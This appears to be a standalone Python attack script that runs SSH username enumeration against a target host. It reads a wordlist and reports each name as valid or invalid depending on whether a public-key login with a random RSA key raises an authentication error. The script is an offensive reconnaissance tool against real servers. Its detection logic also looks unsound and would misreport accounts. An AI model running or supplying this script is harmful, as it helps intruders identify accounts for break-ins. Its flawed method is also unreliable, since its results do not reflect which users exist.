import argparse
import paramiko
import socket
import sys

class InvalidUsername(Exception):
    pass

def check_username(hostname, port, username):
    try:
        sock = socket.socket()
        sock.connect((hostname, port))

        transport = paramiko.Transport(sock)
        transport.start_client()

        try:
            transport.auth_publickey(username, paramiko.RSAKey.generate(2048))
        except paramiko.ssh_exception.AuthenticationException:
            print(f'[*] Invalid username: {username}')
            return False
        else:
            print(f'[+] Valid username: {username}')
            return True

    except (socket.error, paramiko.ssh_exception.SSHException):
        print('[-] Failed to connect or authenticate')
        return False

    finally:
        transport.close()

if __name__ == "__main__":
    # Argument parser with -t for target, -p for port, and -U for username file
    arg_parser = argparse.ArgumentParser()
    arg_parser.add_argument('-t', '--hostname', type=str, required=True, help="Target hostname")
    arg_parser.add_argument('-p', '--port', type=int, default=22, help="SSH Port (default is 22)")
    arg_parser.add_argument('-U', '--username_file', type=str, required=True, help="File containing usernames")
    args = arg_parser.parse_args()

    with open(args.username_file, 'r') as file:
        usernames = file.readlines()

    for username in usernames:
        username = username.strip()
        check_username(args.hostname, args.port, username)
